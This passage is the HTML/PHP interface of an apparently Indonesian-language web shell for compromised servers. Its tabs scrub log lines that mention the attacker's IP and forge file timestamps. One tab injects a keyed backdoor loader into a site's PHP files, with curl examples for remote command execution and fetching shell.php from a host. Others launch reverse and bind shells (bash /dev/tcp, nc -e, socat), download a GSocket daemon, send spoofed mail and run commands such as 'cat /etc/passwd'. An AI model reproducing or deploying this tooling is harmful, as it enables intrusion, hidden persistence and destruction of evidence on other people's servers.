            <div style="display:flex;align-items:center;gap:6px;margin-top:18px;">
                <input type="checkbox" name="hskip" value="1" checked> <span class="muted">skip node_modules/vendor/.git/cache</span></div>
        </div>
        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Scan"></div>
    </form>
</div>
<?php if ($hunt_state && isset($hunt_state['rows'])): ?>
<div class="box">
    <div class="muted" style="margin-bottom:8px;">
        <b style="color:#7ee787;"><?php echo count($hunt_state['rows']); ?></b> hasil ·
        <?php echo (int)$hunt_state['scanned']; ?> file dipindai ·
        <?php echo h($hunt_state['elapsed']); ?>s<?php echo $hunt_state['truncated'] ? ' · <span style="color:#e3b341;">dipotong (budget/limit)</span>' : ''; ?>
        <?php if (!empty($hunt_state['rows'])): ?>
            <button type="button" class="btn" style="margin-left:8px;" onclick="widCopyText(this, <?php echo h(json_encode(implode("\n", array_map(function ($x) { return $x['path']; }, $hunt_state['rows'])))); ?>, 'tersalin')">Salin semua path</button>
        <?php endif; ?>
    </div>
    <table>
        <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Match</th><th>Aksi</th></tr></thead>
        <tbody>
        <?php $hshown = 0; foreach ($hunt_state['rows'] as $hr): if (!@file_exists($hr['path'])) continue; $hshown++; ?>
            <tr>
                <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($hr['path']); ?></td>
                <td style="white-space:nowrap;"><?php echo h(format_size($hr['size'])); ?></td>
                <td style="white-space:nowrap;font-size:11px;"><?php echo h(date('Y-m-d H:i', $hr['mtime'])); ?></td>
                <td style="font-size:11px;max-width:340px;">
                    <?php if (!empty($hr['sig'])): ?><span style="color:#e3b341;">[<?php echo h($hr['sig']); ?>]</span> <?php endif; ?>
                    <?php if ($hr['line'] > 0): ?><span style="color:#8e99ab;">L<?php echo (int)$hr['line']; ?>:</span> <?php endif; ?>
                    <?php if ($hr['snippet'] !== ''): ?><code><?php echo h($hr['snippet']); ?></code><?php endif; ?>
                </td>
                <td class="quick" style="white-space:nowrap;">
                    <a class="btn" href="?view=<?php echo urlencode($hr['path']); ?>&tab=hunt&path=<?php echo urlencode($cwd_real); ?>">Lihat</a>
                    <a class="btn" href="?edit=<?php echo urlencode($hr['path']); ?>&tab=hunt&path=<?php echo urlencode($cwd_real); ?>">Edit</a>
                    <a class="btn" href="?download=<?php echo urlencode($hr['path']); ?>">DL</a>
                    <a class="btn btn-red" href="?delete_path=<?php echo urlencode($hr['path']); ?>&tab=hunt&path=<?php echo urlencode($cwd_real); ?>" onclick="return confirm('Hapus file ini permanen?');">Hapus</a>
                </td>
            </tr>
        <?php endforeach; if ($hshown === 0): ?>
            <tr><td colspan="5" class="muted">Tidak ada hasil (atau semua file hasil sudah dihapus).</td></tr>
        <?php endif; ?>
        </tbody>
    </table>
</div>
<?php endif; ?>
<?php endif; ?>
<?php if ($tab === 'logs'): ?>
<?php
$log_cands = array();
$elog = @ini_get('error_log');
if ($elog && $elog !== 'syslog') $log_cands[] = $elog;
$log_globs = array(
    __DIR__ . '/error_log',
    __DIR__ . '/*.log',
    dirname(__DIR__) . '/logs/*',
    '/var/log/apache2/*.log',
    '/var/log/httpd/*.log',
    '/var/log/nginx/*.log',
    '/var/log/php*.log',
    '/var/log/messages',
    '/var/log/syslog',
    '/var/log/auth.log',
    '/var/log/secure',
    '/usr/local/apache/logs/*',
    '/usr/local/lsws/logs/*',
    '/home/*/logs/*',
    '/home/*/access-logs/*',
    '/var/www/*/logs/*',
);
$lg_home = rct_home();
if ($lg_home !== '') $log_globs[] = $lg_home . '/logs/*';
foreach ($log_globs as $lg) {
    $hits = @glob($lg);
    if (is_array($hits)) { foreach ($hits as $hx) { $log_cands[] = $hx; } }
}
$log_rows = array(); $lg_seen = array();
foreach ($log_cands as $lx) {
    $lx = str_replace('\\', '/', $lx);
    if (isset($lg_seen[$lx]) || !@is_file($lx)) continue;
    $lg_seen[$lx] = 1;
    $log_rows[] = array('p' => $lx, 's' => @filesize($lx), 'm' => @filemtime($lx), 'w' => @is_writable($lx));
}
usort($log_rows, function ($a, $b) { return $b['m'] - $a['m']; });
$log_rows = array_slice($log_rows, 0, 60);
$lg_tail = isset($_GET['tail']) ? (string)$_GET['tail'] : '';
$lg_pre = isset($_GET['log']) ? (string)$_GET['log'] : $lg_tail;
$lg_ips = array();
if (!empty($_SERVER['REMOTE_ADDR'])) $lg_ips[] = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $lg_ips[] = $_SERVER['HTTP_X_FORWARDED_FOR'];
$lg_defpat = implode(', ', array_merge(array_values(array_unique($lg_ips)), array(basename(__FILE__), '.rct_')));
?>
<div class="box">
    <div class="name">Logs &amp; Cleanup</div>
    <div class="muted" style="margin-bottom:10px;">Ketemu <?php echo count($log_rows); ?> file log. Tail, scrub baris yang nyebut kita, atau kosongin — backup <code>.rct_bak</code> otomatis dibuat.</div>
    <?php if ($lg_tail !== '' && @is_file($lg_tail) && @is_readable($lg_tail)): ?>
    <div style="margin-bottom:14px;">
        <b>Tail 300 baris: <code><?php echo h($lg_tail); ?></code></b>
        <pre style="background:#0a0e14; padding:10px; margin-top:6px; max-height:420px; overflow:auto; font-size:11px; white-space:pre-wrap; word-break:break-all;"><?php echo h(rct_tail($lg_tail, 300)); ?></pre>
        <a class="btn" href="?tab=logs&path=<?php echo urlencode($cwd_real); ?>">Tutup tail</a>
    </div>
    <?php endif; ?>
    <?php if ($log_rows): ?>
    <table>
        <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>W</th><th>Aksi</th></tr></thead>
        <tbody>
        <?php foreach ($log_rows as $lr): ?>
            <tr>
                <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($lr['p']); ?></td>
                <td style="white-space:nowrap;"><?php echo h(format_size($lr['s'])); ?></td>
                <td style="white-space:nowrap;font-size:11px;"><?php echo h(date('Y-m-d H:i', $lr['m'])); ?></td>
                <td><?php echo $lr['w'] ? '<span style="color:#7ee787;">w</span>' : '<span style="color:#ff7b72;">ro</span>'; ?></td>
                <td class="quick" style="white-space:nowrap;">
                    <a class="btn" href="?tab=logs&tail=<?php echo urlencode($lr['p']); ?>&path=<?php echo urlencode($cwd_real); ?>">Tail</a>
                    <a class="btn" href="?tab=logs&log=<?php echo urlencode($lr['p']); ?>&path=<?php echo urlencode($cwd_real); ?>">Scrub</a>
                    <form method="post" style="display:inline;"><input type="hidden" name="logs_action" value="truncate"><input type="hidden" name="log_file" value="<?php echo h($lr['p']); ?>"><input type="submit" class="btn btn-red" value="Kosongkan" onclick="return confirm('Kosongkan file ini? Backup .rct_bak dibuat.');"></form>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    <?php else: ?>
    <div class="muted">Nggak nemu log di path umum (open_basedir / permission / lokasi custom) — isi path manual di form bawah.</div>
    <?php endif; ?>
</div>

<form method="post" class="box">
    <div class="name">Scrub log</div>
    <div class="muted" style="margin-bottom:8px;font-size:11px;">Hapus semua baris yang mengandung salah satu pattern (pisah koma atau newline, case-insensitive). File bakal ditulis ulang penuh.</div>
    <input type="text" name="log_file" value="<?php echo h($lg_pre); ?>" placeholder="/var/log/apache2/access.log" style="width:100%;font-size:11px;margin-bottom:6px;">
    <textarea name="log_pattern" rows="3" style="width:100%;font-size:11px;font-family:Consolas,monospace;"><?php echo h($lg_defpat); ?></textarea>
    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px; align-items:center;">
        <input type="submit" name="logs_action" value="scrub" class="btn btn-green" onclick="return confirm('Scrub file log ini? Backup .rct_bak dibuat.');">
        <span class="muted" style="font-size:11px;">mtime:</span>
        <input type="text" name="log_time" placeholder="2026-11-01 03:14:00" style="width:170px;font-size:11px;">
        <input type="submit" name="logs_action" value="mtime" class="btn btn-yellow" formnovalidate>
    </div>
</form>

<div class="box">
    <div class="name">Jejak Panel</div>
    <div class="muted" style="margin-bottom:8px;font-size:11px;">Hapus file state, semua backup, dan sisa <code>.rct_*</code> di direktori panel. Cron watchdog &amp; SSH key dicabut dari tab Persistence.</div>
    <form method="post"><input type="hidden" name="logs_action" value="clean_rct"><input type="submit" class="btn btn-red" value="Bersihin jejak panel" onclick="return confirm('Hapus state + backup + sisa .rct_* ?');"></form>
</div>
<?php endif; ?>
<?php if ($tab === 'mail'): ?>
<form method="post" class="box mail-form">
    <div class="name">Kirim Email</div>
    <div class="mf-sub">Mailer <code>mail()</code> from: <code><?php echo h($m_from_addr); ?></code><?php if ($m_user !== ''): ?> <span class="muted">&middot; akun: <?php echo h($m_user); ?><?php echo $m_box_list ? ' &middot; mailbox: ' . h(implode(', ', array_slice($m_box_list, 0, 4))) : ''; ?></span><?php endif; ?></div>

    <div class="mf-row">
        <label class="mf-label" for="mf-to">Email Target</label>
        <input type="text" id="mf-to" name="m_to" value="<?php echo h(isset($_POST['m_to']) ? $_POST['m_to'] : ''); ?>" placeholder="contoh: admin@site.com atau a@x.com, b@y.com" autocomplete="off">
    </div>

    <div class="mf-cols">
        <div class="mf-col">
            <label class="mf-label" for="mf-from-name">Nama Pengirim</label>
            <input type="text" id="mf-from-name" name="m_from_name" value="<?php echo h(isset($_POST['m_from_name']) ? $_POST['m_from_name'] : ''); ?>" placeholder="contoh: Admin Website" autocomplete="off">
        </div>
        <div class="mf-col">
            <label class="mf-label" for="mf-subject">Subjek</label>
            <input type="text" id="mf-subject" name="m_subject" value="<?php echo h(isset($_POST['m_subject']) ? $_POST['m_subject'] : ''); ?>" placeholder="kosong = Notifikasi Akses Website" autocomplete="off">
        </div>
    </div>

    <div class="mf-row">
        <label class="mf-label" for="mf-body">Pesan</label>
        <textarea id="mf-body" name="m_body" rows="10" placeholder="kosong = notifikasi akses otomatis (waktu, IP, website)"><?php echo h(isset($_POST['m_body']) ? $_POST['m_body'] : ''); ?></textarea>
    </div>

    <div class="mf-foot">
        <input type="submit" name="mail_action" value="Kirim" class="btn btn-green">
    </div>
</form>
<?php endif; ?>
<?php if ($tab === 'inject'): ?>
<?php
$ij = rct_state_load($rct_inj_manifest);
$ij_key = isset($ij['key']) ? $ij['key'] : '';
$ij_map = isset($ij['files']) && is_array($ij['files']) ? $ij['files'] : array();
$ij_files = rct_inj_scan($rct_inj_root);
$ij_inj = 0; $ij_w = 0;
foreach ($ij_files as $ij_f) {
    if (@is_writable($ij_f)) $ij_w++;
    $ij_src = @file_get_contents($ij_f);
    if ($ij_src !== false && strpos($ij_src, '/*RCT-INJ:START*/') !== false) $ij_inj++;
}
$ij_show = array_slice($ij_files, 0, 400);
$ij_cnt = count($ij_files);
$ij_url = 'http://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'domain') . '/index.php';
?>
<div class="box">
    <div class="name">Site File Injector</div>
    <div class="muted" style="font-size:11px;margin:4px 0 12px 0;">
        nyisipin loader ber-marker ke ujung file PHP situs. shell utama hilang, loader tetap jalan di file aplikasi.
        docroot: <code><?php echo h($rct_inj_root); ?></code>
    </div>

    <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:14px;">
        <div class="mail-form" style="flex:1;min-width:150px;padding:10px;margin:0;background:#0f1117;">
            <div class="muted" style="font-size:10px;text-transform:uppercase;">file php</div>
            <div style="font-size:18px;color:#e6edf3;"><?php echo $ij_cnt; ?></div>
        </div>
        <div class="mail-form" style="flex:1;min-width:150px;padding:10px;margin:0;background:#0f1117;">
            <div class="muted" style="font-size:10px;text-transform:uppercase;">writable</div>
            <div style="font-size:18px;color:#7ee787;"><?php echo $ij_w; ?></div>
        </div>
        <div class="mail-form" style="flex:1;min-width:150px;padding:10px;margin:0;background:#0f1117;">
            <div class="muted" style="font-size:10px;text-transform:uppercase;">sudah ter-inject</div>
            <div style="font-size:18px;color:#e3b341;"><?php echo $ij_inj; ?></div>
        </div>
    </div>

    <?php if ($ij_key === ''): ?>
        <div class="msg" style="margin-bottom:12px;">Key belum dibuat — klik <b>Key baru</b> dulu sebelum inject.</div>
    <?php else: ?>
        <div class="mf-row">
            <label class="mf-label">Key akses</label>
            <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
                <input type="text" id="ij-key" value="<?php echo h($ij_key); ?>" readonly style="flex:1;min-width:200px;font-family:Consolas,monospace;">
                <button type="button" class="btn" onclick="rctCopy('ij-key')">Copy</button>
            </div>
        </div>
        <div class="mf-row">
            <label class="mf-label">Cara manggil</label>
            <pre class="mail-log" style="margin:0;">cek hidup : <?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>            &rarr; balik "RCT" doang
exec GET  : <?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>&c=<?php echo urlencode('echo 7*6;'); ?>

exec POST : curl -s --data-urlencode "c=echo 7*6;" "<?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>"
file      : curl -s --data-urlencode "f=/path/a.txt" --data-urlencode "d=isi" "<?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>"
fetch     : curl -s --data-urlencode "u=http://host/shell.txt" --data-urlencode "f=/path/shell.php" "<?php echo h($ij_url); ?>?rct=<?php echo h($ij_key); ?>"</pre>
        </div>
        <div class="mf-row">
            <label class="mf-label">Payload yang ditanam</label>
            <pre class="mail-log" style="margin:0;max-height:120px;"><?php echo h(rct_inj_payload($ij_key)); ?></pre>
        </div>
    <?php endif; ?>

    <div class="mf-foot" style="border-top:none;padding-top:0;">
        <form method="post" style="display:inline;"><input type="hidden" name="inject_act" value="newkey"><input type="submit" class="btn btn-yellow" value="Key baru"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="inject_act" value="revert"><input type="submit" class="btn btn-red" value="Revert semua" onclick="return confirm('Cabut marker dari semua file yang ter-inject?');"></form>
        <span class="muted" style="font-size:11px;">backup asli: <code>.rct_inj/</code> &middot; manifest: <code>.rct_inject.json</code></span>
    </div>
</div>

<form method="post" class="box">
    <div class="name" style="margin-bottom:8px;">File kandidat (<?php echo count($ij_show); ?><?php echo $ij_cnt > 400 ? ' dari ' . $ij_cnt : ''; ?>)</div>
    <div style="max-height:420px;overflow:auto;">
        <table class="fm-table">
            <tr><th class="col-check"><input type="checkbox" onclick="var c=document.querySelectorAll('input[name=\'inj[]\']');for(var i=0;i<c.length;i++)c[i].checked=this.checked;"></th><th>file</th><th class="col-small">size</th><th class="col-small">status</th></tr>
            <?php foreach ($ij_show as $ij_f):
                $ij_has = strpos((string)@file_get_contents($ij_f), '/*RCT-INJ:START*/') !== false;
                $ij_wr  = @is_writable($ij_f);
                $ij_st  = $ij_has ? array('ter-inject', '#e3b341') : ($ij_wr ? array('writable', '#7ee787') : array('read-only', '#8e99ab'));
                $ij_rel = ltrim(str_replace($rct_inj_root, '', $ij_f), '/');
            ?>
            <tr>
                <td class="col-check"><input type="checkbox" name="inj[]" value="<?php echo h($ij_f); ?>" <?php echo $ij_has ? 'checked disabled' : ($ij_wr ? '' : 'disabled'); ?>></td>
                <td class="col-name" style="font-size:11px;"><?php echo h($ij_rel); ?></td>
                <td class="col-small" style="font-size:11px;"><?php echo h(format_size(@filesize($ij_f))); ?></td>
                <td class="col-small" style="font-size:11px;color:<?php echo $ij_st[1]; ?>;"><?php echo $ij_st[0]; ?></td>
            </tr>
            <?php endforeach; ?>
            <?php if (!$ij_show) echo '<tr><td colspan="4">Nggak ada file .php di docroot.</td></tr>'; ?>
        </table>
    </div>
    <div class="mf-foot">
        <button type="submit" name="inject_act" value="inject" class="btn btn-green" onclick="return confirm('Tanam loader ke file terpilih? Backup .rct_inj dibuat dulu.');">Inject terpilih</button>
        <button type="submit" name="inject_act" value="revert" class="btn btn-red" onclick="return confirm('Cabut marker dari file terpilih?');">Revert terpilih</button>
    </div>
</form>
<?php endif; ?>
<?php if ($tab === 'info'): ?>
<?php
$i_uid   = function_exists('posix_geteuid') ? @posix_geteuid() : '-';
$i_gid   = function_exists('posix_getegid') ? @posix_getegid() : '-';
$i_os    = function_exists('php_uname') ? @php_uname('s') . ' ' . @php_uname('r') . ' ' . @php_uname('m') : '-';
$i_sapi  = function_exists('php_sapi_name') ? @php_sapi_name() : '-';
$i_tmp   = @sys_get_temp_dir();
$i_tmpw  = ($i_tmp !== '' && @is_writable($i_tmp));
$i_cwdw  = @is_writable($cwd_real);
$i_drw   = (!empty($_SERVER['DOCUMENT_ROOT']) && @is_writable($_SERVER['DOCUMENT_ROOT']));
$i_proc  = @is_readable('/proc/self/status');
$i_cg    = @file_get_contents('/proc/1/cgroup');
$i_ctn   = @file_exists('/.dockerenv') || ($i_cg && preg_match('/docker|lxc|kubepods/i', $i_cg));
$i_fns = array('exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec','expect_popen','putenv','dl','mail','imap_open','mysqli_connect','fsockopen','symlink','link','chmod','copy','rename','tmpfile','glob');
$i_bins = array('bash','sh','dash','busybox','nc','ncat','socat','python','python3','perl','ruby','node','php','wget','curl','gcc','make','nasm','git','tar','zip','unzip','openssl','base64','crontab','systemctl','docker','mysql','psql','redis-cli','nmap','tcpdump','grep','find');
$i_exts = array('curl','openssl','mysqli','pdo_mysql','pdo_sqlite','sqlite3','zip','posix','pcntl','sockets','mbstring','iconv','gd','imagick','ftp','ssh2','ffi','com_dotnet','json','xml','simplexml','dom','phar','fileinfo');
$i_limits = array(
    'memory_limit' => @ini_get('memory_limit'),
    'max_execution_time' => @ini_get('max_execution_time'),
    'post_max_size' => @ini_get('post_max_size'),
    'upload_max_filesize' => @ini_get('upload_max_filesize'),
    'max_input_vars' => @ini_get('max_input_vars'),
    'max_file_uploads' => @ini_get('max_file_uploads'),
    'allow_url_fopen' => @ini_get('allow_url_fopen'),
    'allow_url_include' => @ini_get('allow_url_include'),
    'display_errors' => @ini_get('display_errors'),
    'session.save_path' => @ini_get('session.save_path'),
    'open_basedir' => $open_basedir !== '' ? $open_basedir : '(kosong)',
    'user_ini.filename' => @ini_get('user_ini.filename'),
);
?>
<div class="box">
    <div class="name">Runtime &amp; Environment</div>
    <table style="margin-top:10px;">
        <tr><td>PHP</td><td><b><?php echo h(PHP_VERSION); ?></b> (<?php echo h($i_sapi); ?>)</td><td>OS</td><td><?php echo h($i_os); ?></td></tr>
        <tr><td>User</td><td><?php echo h($self_user); ?> (uid <?php echo h($i_uid); ?>, gid <?php echo h($i_gid); ?>)</td><td>Host</td><td><?php echo h($hostname); ?></td></tr>
        <tr><td>Docroot</td><td style="word-break:break-all;"><?php echo h($doc_root); ?> <?php echo $i_drw ? '<span style="color:#7ee787;">[w]</span>' : '<span style="color:#ff7b72;">[ro]</span>'; ?></td><td>CWD</td><td style="word-break:break-all;"><?php echo h($cwd_real); ?> <?php echo $i_cwdw ? '<span style="color:#7ee787;">[w]</span>' : '<span style="color:#ff7b72;">[ro]</span>'; ?></td></tr>
        <tr><td>Temp</td><td style="word-break:break-all;"><?php echo h($i_tmp); ?> <?php echo $i_tmpw ? '<span style="color:#7ee787;">[w]</span>' : '<span style="color:#ff7b72;">[ro]</span>'; ?></td><td>/proc</td><td><?php echo $i_proc ? '<span style="color:#7ee787;">readable</span>' : '<span style="color:#ff7b72;">blocked</span>'; ?></td></tr>
        <tr><td>Container</td><td><?php echo $i_ctn ? '<span style="color:#e3b341;">yes (docker/lxc)</span>' : 'no / unknown'; ?></td><td>Disk (dir ini)</td><td><?php echo $disk_free !== false ? h(format_size($disk_free)) . ' free / ' . h(format_size($disk_total)) : '-'; ?></td></tr>
        <tr><td>open_basedir</td><td colspan="3" style="word-break:break-all;"><?php echo h($open_basedir !== '' ? $open_basedir : '(kosong)'); ?></td></tr>
    </table>
</div>

<div class="box">
    <div class="name">PHP Functions (exec &amp; fs)</div>
    <table style="margin-top:10px;">
        <?php $i_keys = $i_fns; $i_half = (int)ceil(count($i_keys) / 3); for ($i = 0; $i < $i_half; $i++) { echo '<tr>'; for ($c = 0; $c < 3; $c++) { $k = isset($i_keys[$i + $c * $i_half]) ? $i_keys[$i + $c * $i_half] : null; if ($k === null) { echo '<td></td>'; continue; } $ok = isset($crit[$k]) ? $crit[$k] : fn_ok($k); echo '<td>' . h($k) . ': <span style="color:' . ($ok ? '#7ee787' : '#ff7b72') . ';font-weight:bold;">' . ($ok ? 'OK' : 'NO') . '</span></td>'; } echo '</tr>'; } ?>
    </table>
    <div class="hint">curl ext: <b style="color:<?php echo function_exists(F('cur')) ? '#7ee787' : '#ff7b72'; ?>;"><?php echo function_exists(F('cur')) ? 'OK' : 'NO'; ?></b></div>
</div>

<div class="box">
    <div class="name">Binaries</div>
    <table style="margin-top:10px;">
        <?php $i_bhalf = (int)ceil(count($i_bins) / 2); for ($i = 0; $i < $i_bhalf; $i++) { echo '<tr>'; for ($c = 0; $c < 2; $c++) { $k = isset($i_bins[$i + $c * $i_bhalf]) ? $i_bins[$i + $c * $i_bhalf] : null; if ($k === null) { echo '<td></td>'; continue; } $p = which_bin($k); echo '<td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;">' . h($k) . ': ' . ($p ? '<span style="color:#7ee787;">' . h($p) . '</span>' : '<span style="color:#ff7b72;">-</span>') . '</td>'; } echo '</tr>'; } ?>
    </table>
</div>

<div class="box">
    <div class="name">PHP Extensions</div>
    <div style="margin-top:10px;display:flex;flex-wrap:wrap;gap:6px;">
        <?php foreach ($i_exts as $ie): $on = @extension_loaded($ie); $ver = $on && function_exists('phpversion') ? @phpversion($ie) : false; ?>
            <span style="background:<?php echo $on ? '#1f3527' : '#3a1f24'; ?>;border:1px solid <?php echo $on ? '#355d42' : '#69323b'; ?>;color:<?php echo $on ? '#7ee787' : '#ff9da7'; ?>;padding:2px 8px;border-radius:4px;font-size:11px;"><?php echo h($ie); ?><?php echo ($ver !== false && $ver !== '') ? ' ' . h($ver) : ''; ?></span>
        <?php endforeach; ?>
    </div>
</div>

<div class="box">
    <div class="name">Limits &amp; disable_functions</div>
    <table style="margin-top:10px;">
        <?php $i_lem = ''; $i_lcount = 0; foreach ($i_limits as $lk => $lv) { if ($lk === 'open_basedir') continue; if ($i_lcount % 2 === 0) $i_lem .= '<tr>'; $i_lem .= '<td>' . h($lk) . '</td><td><b>' . h($lv === false || $lv === null || $lv === '' ? '(kosong)' : $lv) . '</b></td>'; if ($i_lcount % 2 === 1) $i_lem .= '</tr>'; $i_lcount++; } if ($i_lcount % 2 === 1) $i_lem .= '<td></td><td></td></tr>'; echo $i_lem; ?>
    </table>
    <div class="hint" style="margin-top:8px;">disabled (<?php echo h($disabled === 'none' ? '0' : count(explode(', ', $disabled))); ?>):</div>
    <pre style="background:#0a0e14;padding:8px;border-radius:6px;max-height:160px;overflow:auto;font-size:11px;color:#c9d1d9;white-space:pre-wrap;"><?php echo h($disabled); ?></pre>
</div>

<div class="box">
    <div class="name">Outbound Test</div>
    <div class="muted" style="margin-bottom:8px;">Check connections (upload URL / callback / CVE download).</div>
    <?php if (!isset($_GET['net'])): ?>
        <a class="btn btn-green" href="?tab=info&net=1&path=<?php echo urlencode($cwd_real); ?>">Test Outbound</a>
    <?php else: ?>
        <?php
        $i_net = array('1.1.1.1:443' => array('1.1.1.1', 443), '8.8.8.8:53' => array('8.8.8.8', 53), 'github.com:443' => array('github.com', 443));
        $i_res = array();
        foreach ($i_net as $lbl => $hp) {
            $st = microtime(true); $en = 0; $es = '';
            $fp = @fsockopen($hp[0], $hp[1], $en, $es, 2);
            if ($fp) { @fclose($fp); $i_res[] = array($lbl, true, round((microtime(true) - $st) * 1000) . 'ms'); }
            else { $i_res[] = array($lbl, false, 'errno ' . $en . ' ' . trim((string)$es)); }
        }
        $i_dns = @gethostbyname('github.com');
        ?>
        <table style="margin-top:8px;">
            <?php foreach ($i_res as $nr): ?>
                <tr><td style="font-family:Consolas,monospace;"><?php echo h($nr[0]); ?></td><td><?php echo $nr[1] ? '<span style="color:#7ee787;font-weight:bold;">OK</span>' : '<span style="color:#ff7b72;font-weight:bold;">GAGAL</span>'; ?></td><td class="muted"><?php echo h($nr[2]); ?></td></tr>
            <?php endforeach; ?>
            <tr><td>DNS github.com</td><td><?php echo ($i_dns && $i_dns !== 'github.com') ? '<span style="color:#7ee787;">' . h($i_dns) . '</span>' : '<span style="color:#ff7b72;">gagal resolve</span>'; ?></td><td class="muted"><?php echo ($i_dns && $i_dns !== 'github.com') ? 'ok' : 'resolver mati'; ?></td></tr>
        </table>
        <div style="margin-top:8px;"><a class="btn" href="?tab=info&path=<?php echo urlencode($cwd_real); ?>">Reset</a></div>
    <?php endif; ?>
</div>
<?php endif; ?>
<?php if ($tab === 'upurl'): ?>
<div class="box">
    <div class="name">Upload from URL</div>
    <form method="post" style="margin-top:8px;">
        <input type="hidden" name="action" value="upload_url">
        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
        <div style="margin-bottom:8px;"><div class="muted" style="margin-bottom:4px;">URL:</div><input type="text" name="url" placeholder="https://..." autocomplete="off"></div>
        <div style="margin-bottom:8px;"><div class="muted" style="margin-bottom:4px;">Save as:</div><input type="text" name="urlname" placeholder="file.php" autocomplete="off"></div>
        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Fetch & Save"> <a class="btn" href="?tab=upurl&path=<?php echo urlencode($cwd_real); ?>">Reset</a></div>
    </form>
</div>
<?php endif; ?>
<?php if ($tab === 'shell'): ?>
<div class="box">
    <div class="name">Shell Manager</div>
    <div class="form-grid">
        <div>
            <div class="muted"><b>Reverse Shell</b></div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="shell_action" value="start_reverse">
                <select name="method" style="width:100%;margin-bottom:6px;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <option value="auto">Auto-detect</option>
                    <option value="python3">Python 3</option>
                    <option value="bash">Bash /dev/tcp</option>
                    <option value="nc">Netcat -e</option>
                    <option value="perl">Perl</option>
                    <option value="php">PHP</option>
                    <option value="ruby">Ruby</option>
                    <option value="socat">Socat</option>
                    <option value="node">Node.js</option>
                    <option value="powershell">PowerShell (Windows)</option>
                </select>
                <input type="text" name="lhost" placeholder="LHOST" style="margin-bottom:6px;">
                <input type="text" name="lport" placeholder="LPORT" style="margin-bottom:6px;">
                <input type="submit" class="btn btn-green" value="Start Reverse">
            </form>
        </div>
        <div>
            <div class="muted"><b>Bind Shell</b></div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="shell_action" value="start_bind">
                <select name="bmethod" style="width:100%;margin-bottom:6px;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <option value="auto">Auto-detect</option>
                    <option value="ncat">ncat -e</option>
                    <option value="nc">nc -e</option>
                    <option value="socat">Socat</option>
                    <option value="python">Python pty</option>
                </select>
                <input type="text" name="bport" placeholder="Bind port" style="margin-bottom:6px;">
                <input type="submit" class="btn btn-green" value="Start Bind">
            </form>
        </div>
    </div>
    <div style="margin-top:14px; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="stop_shell"><input type="submit" class="btn btn-red" value="Stop Shell"></form>
        <a class="btn" href="#" onclick="rctPoll();return false;">Refresh Output</a>
        <span class="muted" id="rct-status">idle</span>
    </div>
    <pre id="rct-out" class="out">(belum ada output)</pre>
</div>
<?php endif; ?>
<?php if ($tab === 'gs'): ?>
<div class="box">
    <div class="name">GSocket</div>
    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:10px;">
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_download"><input type="submit" class="btn" value="1. Download gs-netcat"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_start"><input type="submit" class="btn btn-green" value="2. Start Daemon"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_stop"><input type="submit" class="btn btn-red" value="Stop"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_rotate"><input type="submit" class="btn btn-yellow" value="Rotate Secret"></form>
        <a class="btn" href="#" onclick="gsPoll();return false;">Refresh</a>
        <span class="muted" id="gs-status">idle</span>
    </div>
    <div style="margin-top:12px;">
        <div class="muted" style="margin-bottom:4px;">Command:</div>
        <div class="gs-cmd-row"><input type="text" id="gs-cmd" readonly value=""><button type="button" class="btn" onclick="copyGsCmd()">Copy</button></div>
    </div>
    <pre id="gs-out" class="out" style="color:#79c0ff; max-height:220px;">(klik Refresh)</pre>
</div>
<?php endif; ?>
<?php if ($tab === 'cmd'): ?>
<div class="box">
    <div class="name">Command Execution</div>
    <div class="muted" style="margin-bottom:8px;">
        <?php
        $alive = array();
        foreach (array('shell_exec','exec','system','passthru','popen','proc_open') as $efo) { if (function_exists($efo) && is_callable($efo)) $alive[] = $efo; }
        ?>
        Status: <?php echo $alive ? '<span style="color:#7ee787;">' . h(implode(', ', $alive)) . '</span>' : '<span style="color:#ff7b72;">off</span>'; ?>
    </div>
    <form method="post">
        <div class="cmd-row">
            <input type="text" name="cmd" id="cmd" placeholder="Enter command..." autocomplete="off">
            <input type="submit" name="run_cmd" class="btn btn-green" value="Execute">
        </div>
        <div class="quick-cmds">
            <button type="button" class="btn" onclick="setCmd('whoami')">whoami</button>
            <button type="button" class="btn" onclick="setCmd('id')">id</button>
            <button type="button" class="btn" onclick="setCmd('uname -a')">uname -a</button>
            <button type="button" class="btn" onclick="setCmd('ls -la')">ls -la</button>
            <button type="button" class="btn" onclick="setCmd('cat /etc/passwd')">passwd</button>
            <button type="button" class="btn" onclick="setCmd('ps aux')">ps aux</button>
            <button type="button" class="btn" onclick="setCmd('df -h')">df -h</button>
            <button type="button" class="btn" onclick="setCmd('env')">env</button>
        </div>
    </form>
</div>
<?php endif; ?>
<?php if ($tab_ext === 'privesc'): ?>
<div class="box">
